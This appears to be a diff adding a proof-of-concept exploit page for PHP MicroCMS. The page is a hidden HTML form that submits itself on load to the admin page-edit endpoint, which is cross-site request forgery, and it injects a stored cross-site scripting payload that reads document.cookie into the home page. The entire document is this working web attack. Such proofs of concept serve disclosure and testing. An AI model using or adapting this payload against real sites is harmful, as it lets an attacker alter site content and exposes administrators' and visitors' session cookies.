@@ -1,0 +1,9 @@
+<form action="http://host/index.php?admin=static_pages_edit&pk=home" method="post" name="main">
+<input type="hidden" name="pk" value="home">
+<input type="hidden" name="page_title" value="Welcome to PHP MicroCMS">
+<input type="hidden" name="page_text" value="text<script>alert(document.cookie)</script>">
+<input type="hidden" name="subSavePage" value="Save Changes">
+</form>
+<script>
+document.main.submit();
+</script>
